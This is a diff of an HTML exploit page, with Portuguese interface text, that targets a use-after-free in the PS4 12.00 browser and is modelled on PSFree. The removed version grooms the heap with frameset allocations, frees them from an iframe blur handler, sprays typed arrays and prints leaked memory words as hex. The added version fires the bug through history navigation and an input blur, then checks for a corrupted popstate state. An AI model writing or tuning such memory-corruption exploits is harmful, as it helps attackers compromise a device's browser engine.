@@ -1,168 +1,79 @@
+
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 12.00 - Perfect Timing (PSFree Hybrid)</title>
+    <title>PS4 12.00 - True PSFree Trigger</title>
     <style>
         body { background-color: #1a1a1a; color: #fff; font-family: monospace; padding: 20px; }
-        button { padding: 15px; font-weight: bold; cursor: pointer; margin-right: 10px; }
+        button { padding: 15px; font-weight: bold; cursor: pointer; background: #e0e0e0; color: #000; }
         #log-area { background: #000; color: #0f0; padding: 15px; border: 1px solid #333; height: 350px; overflow-y: scroll; display: none; margin-top: 20px;}
-        .highlight { color: #fff; background-color: #d32f2f; padding: 2px; }
+        input { padding: 10px; font-size: 16px; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-    <h2>PS4 12.00 - UAF Exploit (Timing Corrigido)</h2>
-    <p>Status: <span id="status" style="color: #ffeb3b;">Aguardando Preparação...</span></p>
+    <h2>PS4 12.00 - True PSFree Trigger</h2>
+    <p>Status: <span id="status" style="color: #ffeb3b;">Aguardando...</span></p>
 
-    <button onclick="prepareMemory()" style="background: #e0e0e0; color: #000;">1. Heap Grooming (PSFree)</button>
-    <button onclick="injectTrigger()" style="background: #e0e0e0; color: #000;">2. Injetar Gatilho (Iframe)</button>
-    <button onclick="verifyLeak()" style="background: #4caf50; color: #fff;">3. Memory Dump (0x50)</button>
+    <button onclick="startPSFree()">Disparar PSFree UAF</button>
+    <br>
+    <input id="hacker-input" type="text" value="Foque aqui e aguarde...">
 
     <div id="log-area"></div>
-    <div id="frame-container" style="margin-top: 20px;"></div>
 
     <script>
-        const ssv_len = 0x50; // 80 bytes
-        const PATTERN = 2.121995791e-314; // 0x41414141...
-        
-        let fsets = [];
-        let indices = [];
-        let controllers = [];
-        let original_loc = location.pathname;
+        const ssv_len = 0x50; // 80 bytes (Tamanho no PS4)
         const statusEl = document.getElementById('status');
         const logArea = document.getElementById('log-area');
+        const input = document.getElementById('hacker-input');
 
-        // ==========================================
-        // PASSO 1: Preparação Perfeita (Não mexemos aqui)
-        // ==========================================
-        function prepareMemory() {
-            controllers = [];
-            fsets = [];
-            indices = [];
+        function startPSFree() {
+            statusEl.innerText = "Preparando histórico...";
             
-            const rows_str = ",".repeat(ssv_len / 8 - 2); 
-
-            function alloc_fs(size) {
-                for (let i = 0; i < size / 2; i++) {
-                    let fset = document.createElement("frameset");
-                    fset.rows = rows_str;
-                    fset.cols = rows_str;
-                    fsets.push(fset);
-                }
-            }
-
-            statusEl.innerText = "Preparando Heap e Histórico...";
-
+            // 1. Criamos os estados no histórico
             history.replaceState("state0", "");
-            alloc_fs(0x180);
+            history.pushState("state1", "", location.pathname + "#foo");
+            history.pushState("state2", ""); // O estado atual
 
-            history.pushState("state1", "", original_loc + "#bar");
-            indices.push(fsets.length);
-            alloc_fs(0x40);
+            // 2. Focamos no Input
+            input.focus();
 
-            history.pushState("state1", "", original_loc + "#foo");
-            indices.push(fsets.length);
-            alloc_fs(0x40);
-
-            history.pushState("state2", "");
-
-            for(let i = 0; i < 5000; i++) {
-                let arr = new Float64Array(10);
-                arr[0] = i;
-                controllers.push(arr);
-            }
-
-            statusEl.innerText = "Memória alinhada (0x50 bytes). Injete o iframe.";
-        }
-
-        // ==========================================
-        // PASSO 2: O Iframe Restaurado (Apenas a mágica que funciona)
-        // ==========================================
-        function injectTrigger() {
-            const container = document.getElementById('frame-container');
-            container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:150px; border:2px dashed red;"></iframe>';
-            const fDoc = document.getElementById('pocFrame').contentWindow.document;
-
-            fDoc.open();
-            fDoc.write(`
-                <html><body style="background:#fff; text-align:center;">
-                    <button onclick="startPoC()" style="padding:15px; background:#f44336; color:#fff; font-weight:bold;">DISPARAR UAF (FS + OPTIONS)</button>
-                    <script>
-                        function startPoC() {
-                            document.documentElement.webkitRequestFullscreen();
-                            
-                            window.onblur = function() {
-                                // 1. O Pulo do Gato: Libera os framesets no pai EXATAMENTE antes do spray
-                                window.parent.triggerUAF_Free();
-
-                                // 2. O seu spray clássico que funciona
-                                let spray = [];
-                                for (let i = 0; i < 8000; i++) {
-                                    spray.push(new Float64Array(10).fill(${PATTERN}));
-                                }
-
-                                // 3. O SEU TEMPO ORIGINAL (1000ms) com o teardown simples
-                                setTimeout(() => {
-                                    document.open();
-                                    document.write('<h2 style="color:green;">FINALIZADO</h2>');
-                                    document.close();
-                                }, 1000);
-                            };
-                        }
-                    <\/script>
-                </body></html>
-            `);
-            fDoc.close();
-            statusEl.innerText = "Iframe pronto. Entre em Fullscreen e aperte OPTIONS.";
-        }
-
-        window.triggerUAF_Free = function() {
-            let target_idx = indices[1]; 
-            for (let i = target_idx - 4; i < target_idx + 4; i++) {
-                if (fsets[i]) {
-                    fsets[i].rows = "";
-                    fsets[i].cols = "";
-                }
-            }
-        };
-
-        // ==========================================
-        // PASSO 3: Validação
-        // ==========================================
-        function verifyLeak() {
-            let corrupted = null;
-            let corruptedIndex = -1;
-
-            for(let i = 0; i < controllers.length; i++) {
-                if (controllers[i][0] !== i) { 
-                    corrupted = controllers[i];
-                    corruptedIndex = i;
-                    break;
-                }
-            }
-
-            logArea.style.display = "block";
-            logArea.innerHTML = "<b>[ INICIANDO ANÁLISE DE MEMÓRIA ]</b><br><br>";
-
-            if (corrupted) {
-                statusEl.innerHTML = "<span style='color:#4caf50;'>✓ SUCESSO! ID Corrompido: " + corruptedIndex + "</span>";
+            // 3. O evento de Blur que será chamado durante o history.back()
+            input.onblur = function() {
+                statusEl.innerText = "Blur ativado! Fazendo Spray...";
                 
-                for(let i = 0; i < 10; i++) {
-                    const val = corrupted[i];
-                    const buf = new ArrayBuffer(8);
-                    new Float64Array(buf)[0] = val;
-                    const hexStr = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
-                    
-                    let isPtr = (hexStr !== "0000000000000000" && !hexStr.includes("41414141"));
-                    let css = isPtr ? "class='highlight'" : "";
-                    
-                    logArea.innerHTML += "Offset [" + i + "]: <span " + css + ">0x" + hexStr + "</span><br>";
+                // Spray com Uint8Array (Idêntico ao PSFree - Linha 236 do psfree.mjs)
+                window.spray_views = [];
+                for (let i = 0; i < 10000; i++) {
+                    let view = new Uint8Array(new ArrayBuffer(ssv_len));
+                    view[0] = 0x41; // 'A'
+                    window.spray_views.push(view);
                 }
-            } else {
-                statusEl.innerHTML = "<span style='color:#f44336;'>✗ FALHA: Nenhuma corrupção.</span>";
-                logArea.innerHTML += "Tente novamente. O tempo do Teardown não colidiu.";
-            }
+            };
+
+            // 4. Ouve o evento de PopState (Quando a página termina de voltar)
+            window.onpopstate = function(event) {
+                logArea.style.display = "block";
+                logArea.innerHTML = "<b>[ RESULTADO DO POPSTATE ]</b><br><br>";
+
+                if (event.state === "state1") {
+                    logArea.innerHTML += "<span style='color:red;'>✗ FALHA: O estado retornou normal ('state1'). O UAF não funcionou.</span>";
+                } else if (event.state === null) {
+                    logArea.innerHTML += "<span style='color:orange;'>! NULO: O estado foi apagado, mas não corrompido.</span>";
+                } else {
+                    // SE CAIR AQUI, VOCÊ VENCEU!
+                    logArea.innerHTML += "<span style='color:green;'>✓ SUCESSO ABSOLUTO! Estado Corrompido:</span><br>";
+                    logArea.innerHTML += JSON.stringify(event.state);
+                    statusEl.innerText = "UAF EXECUTADO COM SUCESSO!";
+                }
+            };
+
+            // 5. O Gatilho: Voltar a página (Isso tira o foco do input e causa o caos)
+            setTimeout(() => {
+                statusEl.innerText = "Voltando no histórico...";
+                history.back();
+            }, 500);
         }
     </script>
 </body>
